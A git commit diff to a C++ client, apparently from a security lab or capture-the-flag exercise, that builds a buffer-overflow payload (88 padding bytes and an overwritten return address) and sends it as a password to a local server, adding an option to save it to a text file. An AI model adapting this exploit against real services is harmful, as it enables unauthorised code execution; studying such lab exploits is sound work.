bf4105faacb3c0a8b5c20c70b7f493795aaf9b0c
rhusiev <63148080+rhusiev@users.noreply.github.com>
2025-04-14 15:56:33 +0300

    Add a .txt payload

--- client.cpp
+++ client.cpp
@@ -11,23 +11,30 @@
 int main(int argc, char *argv[]) {
     int port = 6248;
     std::string ip_address = "127.0.0.1";
-    std::unique_ptr<char[]> payload(new char[88 + 8 + 1]);
-    int length = 88 + 8 + 1;
+    std::unique_ptr<char[]> payload(new char[88 + 8 + 2]);
+    int length = 88 + 8 + 2;
     for (int i = 0; i < 88; i++) {
         payload[i] = ' ';
     }
     *(reinterpret_cast<size_t *>(payload.get() + 88)) = 0x00401b5c;
     payload[88 + 8] = '\n';
-    if (argc == 3) {
-        port = atoi(argv[1]);
-        ip_address = argv[2];
+    payload[88 + 9] = '\0';
+    if (argc == 2) {
+        std::string filaneme_for_payload = argv[1];
+        std::ofstream file(filaneme_for_payload);
+        file << payload.get();
+        return 0;
+    } else if (argc == 3) {
+        port = atoi(argv[2]);
+        ip_address = argv[1];
     } else if (argc == 4) {
-        port = atoi(argv[1]);
-        ip_address = argv[2];
+        port = atoi(argv[2]);
+        ip_address = argv[1];
         std::string filename_with_payload = argv[3];
         std::string contents;
         std::ifstream file(filename_with_payload);
         std::getline(file, contents);
+        contents += "\n";
         length = contents.size();
         payload.reset(new char[length + 1]);
         std::copy(contents.begin(), contents.end(), payload.get());
@@ -35,6 +42,8 @@ int main(int argc, char *argv[]) {
         std::cerr << "Too many arguments" << std::endl;
         return 1;
     }
+
+    std::cout << "Connecting to: " << ip_address << ":" << port << std::endl;
 
     sockaddr_in server;
     int socket_descriptor = socket(AF_INET, SOCK_STREAM, 0);
@@ -65,7 +74,8 @@ int main(int argc, char *argv[]) {
 
         if (strstr(buffer, "Please enter a password to continue:") != nullptr) {
             send(socket_descriptor, payload.get(), length, 0);
-            std::cout << "Sent password: " << payload.get() << std::endl;
+            std::cout << "Sent password: '" << payload.get() << "'"
+                      << std::endl;
         }
 
         if (strstr(buffer, "Success!") != nullptr ||
